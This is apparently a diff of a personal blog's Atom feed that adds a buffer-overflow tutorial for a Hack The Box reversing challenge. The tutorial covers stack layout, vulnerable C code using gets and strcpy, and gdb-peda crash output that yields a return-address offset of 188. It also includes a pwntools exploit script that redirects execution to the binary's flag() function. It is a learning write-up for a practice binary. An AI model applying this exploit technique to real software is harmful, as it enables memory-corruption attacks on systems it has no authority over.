@@ -1,6 +1,14 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.1">Jekyll</generator><link href="https://www.agalera.eu/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.agalera.eu/" rel="alternate" type="text/html" /><updated>2023-01-04T12:58:49+01:00</updated><id>https://www.agalera.eu/feed.xml</id><title type="html">Adrian Galera blog</title><subtitle>My personal developer blog page</subtitle><entry><title type="html">Reversing playbook</title><link href="https://www.agalera.eu/reversing-playbook/" rel="alternate" type="text/html" title="Reversing playbook" /><published>2023-01-04T00:00:00+01:00</published><updated>2023-01-04T00:00:00+01:00</updated><id>https://www.agalera.eu/reversing-playbook</id><content type="html" xml:base="https://www.agalera.eu/reversing-playbook/">&lt;p&gt;I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I’ll use this article to save all the steps I take to complete the challenges related with reversing.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.1">Jekyll</generator><link href="https://www.agalera.eu/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.agalera.eu/" rel="alternate" type="text/html" /><updated>2023-01-04T16:48:15+01:00</updated><id>https://www.agalera.eu/feed.xml</id><title type="html">Adrian Galera blog</title><subtitle>My personal developer blog page</subtitle><entry><title type="html">Reversing playbook</title><link href="https://www.agalera.eu/reversing-playbook/" rel="alternate" type="text/html" title="Reversing playbook" /><published>2023-01-04T00:00:00+01:00</published><updated>2023-01-04T00:00:00+01:00</updated><id>https://www.agalera.eu/reversing-playbook</id><content type="html" xml:base="https://www.agalera.eu/reversing-playbook/">&lt;p&gt;I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I’ll use this article to save all the steps I take to complete the challenges related with reversing.&lt;/p&gt;
 
 &lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;table-of-contents&quot;&gt;Table of contents&lt;/h2&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#buffer-overflow&quot;&gt;Buffer overflow&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;introduction-&quot;&gt;Introduction &lt;a name=&quot;introduction&quot;&gt;&lt;/a&gt;&lt;/h3&gt;
 
 &lt;p&gt;There are a series of challenges where you are given a binary file and you need to be able to obtain the flag inside. In order to do so, you need to perform Reverse engineering. In order to do so, you should use a debugger or a decompiler (or both).&lt;/p&gt;
 
@@ -12,7 +20,198 @@
 
 &lt;p&gt;Another interesting tool is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb&lt;/code&gt;, the gnu debugger. More on this to come, when i’m not familiar.&lt;/p&gt;
 
-&lt;p&gt;To debug Windows binaries, you can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ollydbg&lt;/code&gt;, analyse the code and place the breakpoints in the interesting addresses.&lt;/p&gt;</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="reverse-engineering" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="reverse-engineering" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the steps I take to complete the challenges related with reversing.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting playbook</title><link href="https://www.agalera.eu/pentesting-playbook/" rel="alternate" type="text/html" title="Pentesting playbook" /><published>2022-12-25T00:00:00+01:00</published><updated>2022-12-25T00:00:00+01:00</updated><id>https://www.agalera.eu/pentesting-playbook</id><content type="html" xml:base="https://www.agalera.eu/pentesting-playbook/">&lt;p&gt;I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I’ll use this article to save all the steps I take to complete the challenges.&lt;/p&gt;
+&lt;p&gt;To debug Windows binaries, you can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ollydbg&lt;/code&gt;, analyse the code and place the breakpoints in the interesting addresses.&lt;/p&gt;
+
+&lt;h3 id=&quot;buffer-overflow-&quot;&gt;Buffer overflow &lt;a name=&quot;buffer-overflow&quot;&gt;&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;In order to understand this attack, first we need to understand how the memory works in the computers.&lt;/p&gt;
+
+&lt;p&gt;We first need to understand that memory has the following regions:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Stack&lt;/td&gt;
+      &lt;td&gt;stores function local variables and information about function calls: return address, arguments, etc..&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Heap&lt;/td&gt;
+      &lt;td&gt;stores the dynamic memory. Used by malloc, etc…&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;BSS&lt;/td&gt;
+      &lt;td&gt;stores the uninitialized static/global variables&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Data&lt;/td&gt;
+      &lt;td&gt;stores the static/global variables&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Text&lt;/td&gt;
+      &lt;td&gt;read only, stores the executable code&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Inside the stack, a new stack frame is created for every function execution. Inside a stack frame, we can see:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Function arguments&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Return address&lt;/td&gt;
+      &lt;td&gt;where to go when the execution ends&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Previous frame pointer&lt;/td&gt;
+      &lt;td&gt;to know what is the stack frame of the function calling this function&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Local variables&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Take this functions as example:&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+  &lt;span class=&quot;cm&quot;&gt;/* The following statement will result in buffer overflow */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;This is definitely longer than 12&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The stack frame for foo() will look like this:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;arguments: str (pointer)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Return address&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Previous Frame Pointer&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Local variables &lt;br /&gt;&lt;br /&gt;buffer[11]&lt;br /&gt;…&lt;br /&gt;buffer[1]&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;In this case, we can keep adding data into the buffer until we reach the memory address of the return address. 
+Then, we can tell the program to jump to any function that we want.&lt;/p&gt;
+
+&lt;p&gt;Knowing that, buffer overflow technique consists in three stages:&lt;/p&gt;
+
+&lt;h3 id=&quot;overflow-the-stack-pointer&quot;&gt;Overflow the stack pointer&lt;/h3&gt;
+
+&lt;p&gt;when a function does not limit the input characters, it can happen that the user inputs more bytes than the expected, e.g: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; function:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_bc&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;180&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+  
+  &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_bc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_bc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;In this case, if the user inputs 200 chars, the program will fail with segmentation fault and the data will be injected in some unknown region of the stack.&lt;/p&gt;
+
+&lt;h3 id=&quot;reach-to-the-return-address&quot;&gt;Reach to the return address&lt;/h3&gt;
+
+&lt;p&gt;Knowing that the function is vulnerable to buffer overflow, we can craft a special payload that change the return address to make it jump where we want.&lt;/p&gt;
+
+&lt;p&gt;In order to do this, the first thing we need to do is find the offset on the input data in order to write to the return address.&lt;/p&gt;
+
+&lt;p&gt;Using ghidra we can find easily the value of the return function as it will be the next instruction just after the invocation to our target function, so you will need to calculate the payload using those values.&lt;/p&gt;
+
+&lt;p&gt;You can do it in a less manual way using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb-peda&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;Knowing that the buffer has 180 chars, let’s suppose that will 200 chars will overflow it, let’s create a pattern of 200 chars:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pattern_create 200 bof.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;and input it to the program:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r &amp;lt; pattern.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;When the program crashes, we’ll see the registers:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
+AAA%AAsAABAA&lt;span class=&quot;nv&quot;&gt;$AAnAACAA&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-AA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;AADAA&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;AA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
+
+Program received signal SIGSEGV, Segmentation fault.
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;----------------------------------registers-----------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+EAX: 0xc9 
+EBX: 0x76414158 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;XAAv&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ECX: 0xf7fa09b4 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0x0 
+EDX: 0x1 
+ESI: 0xffffcf94 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0xffffd165 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home/gal/workspace/hack-the-box/boxes/you-know-0x-diables/vuln&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+EDI: 0xf7ffcb80 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0x0 
+EBP: 0x41594141 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;AAYA&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ESP: 0xffffceb0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ZAAxAAyA&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+EIP: 0x41417741 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;AwAA&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+EFLAGS: 0x10286 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;carry PARITY adjust zero SIGN &lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;INTERRUPT direction overflow&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-------------------------------------code-------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+Invalid &lt;span class=&quot;nv&quot;&gt;$PC&lt;/span&gt; address: 0x41417741
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;------------------------------------stack-------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+0000| 0xffffceb0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ZAAxAAyA&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0004| 0xffffceb4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AAyA&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0008| 0xffffceb8 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0xf7fbeb00 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0xf7d8fcd4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GCC_3.0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0012| 0xffffcebc &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0x3e8 
+0016| 0xffffcec0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0xffffcee0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0x1 
+0020| 0xffffcec4 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0xf7f9f000 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0x229dac 
+0024| 0xffffcec8 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0xf7ffd020 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0xf7ffda40 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0x0 
+0028| 0xffffcecc &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0xf7d96519 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0x8310c483 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+Legend: code, data, rodata, value
+0x41417741 &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ?? &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The interesting one is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EIP&lt;/code&gt; as it is the register that points to the next instruction. Note that if you change the payload, the value of the EIP pointer will change as well.&lt;/p&gt;
+
+&lt;p&gt;Now, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pattern_offset&lt;/code&gt; to obtain exactly the number of characters to reach to Return address:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pattern_offset 0x41417741
+1094809409 found at offset: 188
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we know that if we write exactly 188 chars, the next content will be written to the return address and we can make the program jump to where we want.&lt;/p&gt;
+
+&lt;h3 id=&quot;write-the-exploit&quot;&gt;Write the exploit&lt;/h3&gt;
+
+&lt;p&gt;In the case I’m working on the exploit just need to call another function in the code. In order to so, I’ll use python &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwntools&lt;/code&gt;: &lt;a href=&quot;https://github.com/Gallopsled/pwntools&quot;&gt;https://github.com/Gallopsled/pwntools&lt;/a&gt; which helps a lot on these kind of things.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;i386&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;linux&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./vuln&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# offset to reach right before return address&apos;s location
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;188&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# craft exploit: offset + flag() + padding + parameter 1 + parameter 2
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;flag&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endian&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;little&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x90909090&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endian&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;little&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc0ded00d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endian&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;little&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Remember that we are jumping to flag() using RET. This means flag() will think itself have a return address. Therefore, we should pad with any 4 bytes of content before we write the 2 parameters.&lt;/p&gt;</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="reverse-engineering" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="reverse-engineering" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the steps I take to complete the challenges related with reversing.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting playbook</title><link href="https://www.agalera.eu/pentesting-playbook/" rel="alternate" type="text/html" title="Pentesting playbook" /><published>2022-12-25T00:00:00+01:00</published><updated>2022-12-25T00:00:00+01:00</updated><id>https://www.agalera.eu/pentesting-playbook</id><content type="html" 